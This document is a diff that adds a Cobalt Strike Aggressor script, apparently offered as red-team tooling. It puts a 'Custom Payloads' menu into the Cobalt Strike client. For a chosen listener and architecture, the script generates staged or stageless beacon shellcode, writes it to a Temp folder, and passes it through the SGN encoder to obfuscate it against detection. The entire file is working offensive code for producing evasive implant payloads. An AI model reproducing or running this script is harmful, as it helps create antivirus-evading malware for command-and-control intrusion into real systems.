@@ -1,0 +1,55 @@
+#Based on https://github.com/EncodeGroup/AggressiveGadgetToJScript
+
+$outpath = "c:\\Temp\\SGN_Shellcode\\shellcode";
+$sgnshellcode = "c:\\Temp\\SGN_Shellcode\\shellcode\\beacon_sgn.bin";
+$sgn = "c:\\Temp\\SGN_Shellcode\\sgn.exe";
+
+
+menubar("Custom Payloads", "custom_payloads");
+
+popup custom_payloads {
+	item "&SGNShellcode" {
+		SGNShellcode();
+	}
+}
+
+sub SGNShellcode {
+	$dialog = dialog("SGNShellcode Payload Generator", %(listener => "", payload_type => "Payload Type: ", output => "output: "), &SGNShellcodeCallback);
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged", "Stageless"));
+	drow_combobox($dialog, "architecture", "Architecture: ", @("x64", "x86"));
+	dbutton_action($dialog, "Generate");
+	dialog_show($dialog);
+}
+
+sub SGNShellcodeCallback {
+	if ($3['listener'] eq "") {
+		show_message("No listener specified!");
+		exit();
+	}
+
+	println("\n\c8[!]\o Generating SGN Shellcode payload...");
+	println("[*] Type: " . $3['payload_type']);
+	println("[*] Architecture: " . $3['architecture']);
+
+	if ($3['payload_type'] eq "Staged") {
+		$shellcode = stager($3['listener'], $3['architecture']);
+	}
+
+	else {
+		$shellcode = artifact_payload($3['listener'], "raw", $3['architecture']);
+	}
+
+	mkdir($outpath);
+	$shellcodefile = openf(">" . $outpath . "/beacon_sgn.bin");
+	writeb($shellcodefile, $shellcode);
+	closef($shellcodefile);
+	$sgnprocess = exec($sgn . " " . $sgnshellcode);
+	@sgndata = readAll($sgnprocess);
+	printAll(@sgndata);
+	println();
+}
+
+println("\n\c9[+]\o Loaded SGNShellcode.cna!");
+println("\c8[!]\o \$outpath set to '\U$outpath\U'");
+println("\c8[!]\o \$sgnprocess set to '\U$sgnprocess\U'");
